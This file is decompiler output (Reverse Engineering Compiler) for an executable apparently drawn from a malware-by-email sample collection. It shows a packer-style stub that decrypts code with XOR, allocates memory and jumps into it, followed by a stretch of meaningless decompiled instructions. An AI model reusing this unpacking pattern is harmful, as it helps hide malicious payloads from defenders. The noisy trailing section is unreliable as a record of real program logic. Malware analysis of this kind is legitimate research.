/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1139/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 004011d5 -> 0040122a */
/* DEST BLOCK NOT FOUND: 00401219 -> 0040122f */
/*	Procedure: 0x00401020 - 0x004011EF
 *	Argument size: 138
 *	Local size: 84
 *	Save regs size: 0
 */

__entry_point__(A1, Adb)
/* unknown */ void  A1;
/* unknown */ void  Adb;
{
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffffc;



    L00401260( & Vffffffe4);
    ecx = Vffffffe4;
    edx = ecx;
    eax = 675872 + (ecx << 14) & -65536;
    edx = edx << 9;
    ecx = eax + -101812;
    ebx = *(ecx + edx);
    ecx = ecx + edx;
    ebx = ebx - 40;
    *(ebp + -231 + Vffffffe4) = ebx;
    Vffffffec = eax + *(ecx - 4) + 255 - Vffffffe4;
    (save) & Vfffffffc;
    (save)4;
    (save)Vfffffff0;
    (save)Vffffffec;
    *__imp__VirtualProtect();
    L004011F0(Vffffffec, Vfffffff0, Vffffffe4);
    ebx = Vffffffec;
    esi = ebx;
    ebx = *(ebx + 275 - Vffffffe4) + esi;
    Vffffffe8 = *(ebx + 6) & 255;
    ecx = Vffffffe4 << 5;
    (save)-6816 + ecx;
    (save)12288;
    eax = ebx + 3520;
    (save) *(eax - (ecx >> 1));
    (save) *(ebx + 52);
    eax = *__imp__VirtualAlloc();
    Vfffffffc = eax;
    L00401240( *(ebx + 299 - Vffffffe4), Vffffffec, Vfffffffc);
    esi = ebx + 248;
L004010ef:
    L00401240( *(esi + 16), Vffffffec + *(esi + 20), Vfffffffc + *(esi + 12));
    esi = esi + 40;
    if(Vffffffe8 = Vffffffe8 - 1) {
        goto L004010ef;
    }
    ecx = *(ebx + -175 + Vffffffe4) + Vfffffffc;
    *( & Adb - Vffffffe4) = ecx;
    edx = Vffffffe4;
    (save)ebp + -299 + edx;
    (save)1287850337 - edx - 1283651305;
    (save)-159 + edx;
    *(4185216 + (Vffffffe4 << 6))();
    eax = L004011F0( & Vffffffac, 56, Vffffffe4);
    ecx = Vffffffe4 + 1580782877 - -1283651305;
    eax = Vfffffffc;
L0040117f:
    eax = eax + 1;
    if(*eax != ecx) {
        goto L0040117f;
    }
    return(L00401240(271 - Vffffffe4, ebp + -299 + Vffffffe4, eax));
    eax = L5ef83faa() ^ -1567799361;
    L124bee2c();
    dl = 53;
    asm("%d clc");
    eax = L5be7ba7b();
    > ? L0040117a : ;
    bl = 110;
    asm("cli");
    asm("adc al,0x45");
    if(!( *ecx = *ecx + 1)) {
        (save)ebx;
        eax = esp;
        asm("sbb al,0x13");
        asm("in eax,dx");
        asm("sbb bh,[ecx+0x5d]");
        (restore)ebx;
        ebp = & A1;
        asm("out 0x86,al");
        if(esi = esi | *esi) {
            goto L0040122a;
        }
        al = 197;
        asm("aam 0xff");
        asm("pushf");
        asm("a16 scasb");
        asm("les edx,[edx+ebp*8+0x59d9480f]");
        *(edi + -456345376) = *(edi + -456345376) | bl;
    }
    dl = 93;
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004011F0 - 0x00401232
 *	Argument size: 4
 *	Local size: 8
 *	Save regs size: 0
 */

L004011F0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    ecx = Ac;
    eax = 311805790 + A10;
    Vfffffff8 = 891907372;
    for(Vfffffffc = 1; 1; Vfffffffc = ~Vfffffffc) {
        *ebx = *ebx ^ eax;
        if(ecx = ecx - 4) {
            break;
        }
        eax = eax + Vfffffff8 + Vfffffffc;
        ebx = ebx + 219 - A10;
    }
}

/*	Procedure: 0x00401233 - 0x0040123F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401233()
{



}

/*	Procedure: 0x00401240 - 0x0040125C
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L00401240(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edi = A10;
    esi = Ac;
    ecx = A8;
    do {
        *edi = *esi;
        esi = esi + 1;
        edi = edi + 1;
    } while(ecx = ecx - 1);
}

/*	Procedure: 0x0040125D - 0x0040125F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040125D()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401260 - 0x0040128A
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401260(A4)
/* unknown */ void  A4;
{



    eax = (4 << 4) + 1;
    eax = *L7FFE0300();
    edx = (eax >> 24) + 16;
    eax = (eax & 15) + edx - 1;
    *A4 = eax;
}

/*	Procedure: 0x0040128B - 0x0040128B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040128B()
{



    asm("int3");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x00401004       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00401008       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x00401010       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x00401020       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
